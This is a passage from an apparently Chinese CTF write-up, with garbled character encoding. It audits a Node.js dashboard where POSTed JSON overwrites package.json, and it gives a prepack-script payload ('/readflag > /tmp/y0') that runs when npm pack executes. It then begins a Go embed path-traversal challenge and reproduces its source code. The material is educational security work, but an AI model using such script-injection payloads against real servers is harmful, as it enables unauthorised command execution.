path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Kill installing dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/KillDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Killing dependencies...&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;ps -ef | grep npm | grep -v grep | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Kill installing dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logout</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Logout&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_login</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">is_admin</span> = <span class="number">0</span>;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¼€å§‹å®¡è®¡ä»£ç äº†ï¼Œå¯ä»¥çœ‹ç½‘é¡µä¸Šè·¯ç”±çš„ä»£ç äº† </p><p><code>// Set dependencies</code>è·¯ç”±</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”±äºè¿™ä¸ªpostå€¼å¯æ§ï¼Œäºæ˜¯dataå°±å¯æ§</p><p><img src="../images/image-20230504195748835.png" alt="image-20230504195748835"></p><p><img src="../images/image-20230504195839820.png" alt="image-20230504195839820"></p><p>è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ª JavaScript å¯¹è±¡ <code>exampleJson</code>ï¼Œè¡¨ç¤ºä¸€ä¸ª Node.js åº”ç”¨ç¨‹åºçš„ <strong>package.json</strong> æ–‡ä»¶å†…å®¹ã€‚è¿™ä¸ªå¯¹è±¡åŒ…å«äº†åº”ç”¨ç¨‹åºçš„åç§°ã€ç‰ˆæœ¬ã€æè¿°ã€ä½œè€…ã€è„šæœ¬ã€è®¸å¯è¯å’Œä¾èµ–é¡¹ç­‰ä¿¡æ¯ã€‚</p><p><code>Object.assign</code> æ–¹æ³•ç”¨äºå°†æ–°çš„å±æ€§å€¼åˆå¹¶åˆ°ç°æœ‰å¯¹è±¡ä¸­ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬å°†ç©ºå¯¹è±¡ <code>&#123;&#125;</code> ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ é€’ç»™ <code>Object.assign</code>ï¼Œå› æ­¤ä¸ä¼šä¿®æ”¹ç°æœ‰å¯¹è±¡ <code>exampleJson</code>ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œè¯¥å¯¹è±¡åŒ…å« <code>exampleJson</code> çš„æ‰€æœ‰å±æ€§ä»¥åŠåœ¨ <code>data</code> å¯¹è±¡ä¸­å®šä¹‰çš„ä»»ä½•æ–°å±æ€§ã€‚</p><p>å¦‚æœ <code>data</code> å¯¹è±¡ä¸­å®šä¹‰äº†ä¸ <code>exampleJson</code> ä¸­ç›¸åŒçš„å±æ€§ï¼Œåˆ™å°†è¦†ç›–åŸæœ‰å±æ€§ã€‚å› æ­¤ï¼Œå¯ä»¥é€šè¿‡ <code>Object.assign</code> æ–¹æ³•æ¥ä¿®æ”¹æˆ–æ›´æ–°ç°æœ‰å¯¹è±¡çš„å±æ€§ã€‚<strong>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>Object.assign</code> æ¥å°† <code>data</code> å¯¹è±¡çš„å±æ€§å€¼åˆå¹¶åˆ° <code>exampleJson</code> å¯¹è±¡ä¸­ï¼Œå®ç°äº†æ›´æ–° package.json æ–‡ä»¶å†…å®¹çš„ç›®çš„ã€‚</strong></p><p><code>//PackDependencies</code>è·¯ç”±</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public&quot;</span>);</span><br><span class="line">    cp.<span class="title function_">exec</span>(<span class="string">&quot;cd &quot;</span> + filePath + <span class="string">&quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;</span>,<span class="function">(<span class="params">err,stdout,stderr</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies error&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;Pack dependencies success&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„æœ‰ä¸ªæ‰§è¡Œå‡½æ•°ï¼Œä»–çš„æ„æ€æ˜¯</p><p><code>cp.exec(&quot;cd &quot; + filePath + &quot;&amp;&amp; npm pack &amp;&amp; mv ./*.tgz ./packs&quot;,(err,stdout,stderr) =&gt; &#123;</code> <code>npm pack</code>å°±ç›¸å½“ä¸é‡æ–°åŠ è½½é‡Œé¢çš„jsonæ•°æ®ä¼šå˜æˆæˆ‘ä»¬æ”¹å˜è¿‡çš„ï¼Œç„¶åexecæ‰§è¡Œ</p><p><img src="../images/image-20230504200640051.png" alt="image-20230504200640051"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶æ¥æ›¿æ¢è¿™ä¸ªä»£ç ï¼Œå› ä¸ºä¸´æ—¶ç›®å½•ä¸‹æ–‡ä»¶æƒé™è¾ƒé«˜</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> exampleJson = </span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line"><span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line"><span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line"><span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line"><span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;/readflag &gt; /tmp/y0&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæœ€åé€šè¿‡showè·¯ç”±å°±å¯ä»¥æˆåŠŸè¿›è¡Œæ–‡ä»¶æŸ¥çœ‹äº†</p><p><img src="../images/image-20230504201002030.png" alt="image-20230504201002030"></p><p>å…ˆå»  <code>url/dashboardIndex/SetDependencies</code>  è¿™ä¸ªç½‘å€æ¥è¿›è¡Œ<strong>package.json</strong>å†…å®¹çš„ä¿®æ”¹</p><p><img src="../images/image-20230504205510103.png" alt="image-20230504205510103"></p><p><strong>è¿™é‡Œæ˜¯åˆ«å¿˜æ”¹äº†ï¼Œä¸ç„¶ä¸Šä¼ ä¸æˆåŠŸ</strong></p><p>ç„¶åå»<code>url/dashboardIndex/PackDependencies</code>è·¯ç”±è¿›è¡Œnpm pack é‡æ–°åŠ è½½jsonæ•°æ®ï¼Œç„¶åè¿›è¡Œexecæ•°æ®çš„æ‰§è¡Œ</p><p><img src="../images/image-20230504202007954.png" alt="image-20230504202007954"></p><p>ç„¶åå»<code>url/dashboardIndex/ShowExampleFile</code>è·¯ç”±è¿›è¡Œæ–‡ä»¶çš„è¯»å–</p><p><img src="../images/image-20230504205542586.png" alt="image-20230504205542586"></p><p>æˆåŠŸ</p><p><strong>è¿™é‡Œè€ƒå¯Ÿçš„nosqlçš„MongoDBç›²æ³¨ï¼Œappé»‘åå•ç»•è¿‡ï¼Œnodejsä»£ç å®¡è®¡ï¼Œnpm packçš„é‡æ–°åŠ è½½</strong></p><p>è¿™é“é¢˜èƒ½å­¦åˆ°æŒºå¤šä¸œè¥¿çš„</p><h2 id="d3go"><a href="#d3go" class="headerlink" title="d3go"></a>d3go</h2><p><strong>bsæ˜¯goç¼–ç¨‹è¯­è¨€çš„æ–°æ‰‹ï¼Œæœ€è¿‘å‘ç°æ–°ç‰¹æ€§â€œgo embedâ€å¾ˆæœ‰æ„æ€ã€‚ä»–å†™äº†ä¸€ä¸ªåœ¨çº¿è§£å‹æœåŠ¡ï¼Œä½¿ç”¨go embedæ‰“åŒ…é™æ€èµ„æºæ–‡ä»¶ã€‚æ‚¨çš„ä»»åŠ¡æ˜¯åˆ©ç”¨æ­¤åº”ç”¨ç¨‹åºçš„æ¼æ´ï¼Œå¯¹å…¶è¿›è¡Œ RCE å¹¶è·å–æ ‡å¿—ã€‚</strong></p><p><strong>ä¸€å¼€å§‹ä¼šæ˜¾ç¤ºERR_EMPTY_RESPONSEï¼Œè¯·ç¨å€™åˆ·æ–°ï¼</strong></p><p><strong>æç¤ºï¼š</strong></p><p><strong>d3go çš„Gamebox æ— æ³•è¿æ¥åˆ°Internetã€‚</strong></p><p>é¢˜ç›®</p><p><img src="../images/image-20230505192100368.png" alt="image-20230505192100368"></p><p><code>go embed</code> çš„é”™è¯¯ä½¿ç”¨å¯¼è‡´æºä»£ç è¢«æ‰“åŒ…åˆ°ç¨‹åºä¸­ã€‚</p><p>è¿™ä¸ä¸æ­£ç¡®çš„é™æ€æ–‡ä»¶æœåŠ¡ç›¸ç»“åˆï¼Œå¯¼è‡´/../è·¯å¾„åˆ—è¡¨â½¬å½•ä»¥è·å–æºä»£ç ã€‚</p><p><img src="../images/image-20230505192841822.png" alt="image-20230505192841822"></p><p><strong>main.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/controller&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/middleware&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line">server := http.Server&#123;</span><br><span class="line">Addr:    <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Handler: r,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := server.Serve(state.Listener); err != <span class="literal">nil</span> &amp;&amp; err != http.ErrServerClosed &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&lt;-state.GracefulShutdown</span><br><span class="line"><span class="keyword">if</span> err := server.Shutdown(<span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">(r *gin.Engine)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line">store := cookie.NewStore(rad[:])</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;mysession&quot;</span>, store))</span><br><span class="line">r.POST(<span class="string">&quot;/login&quot;</span>, controller.Login)</span><br><span class="line">r.POST(<span class="string">&quot;/register&quot;</span>, controller.Register)</span><br><span class="line">r.GET(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">r.HEAD(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">admin := r.Group(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">admin.Use(middleware.Auth())</span><br><span class="line">admin.POST(<span class="string">&quot;/upload&quot;</span>, controller.Upload)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>config.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span 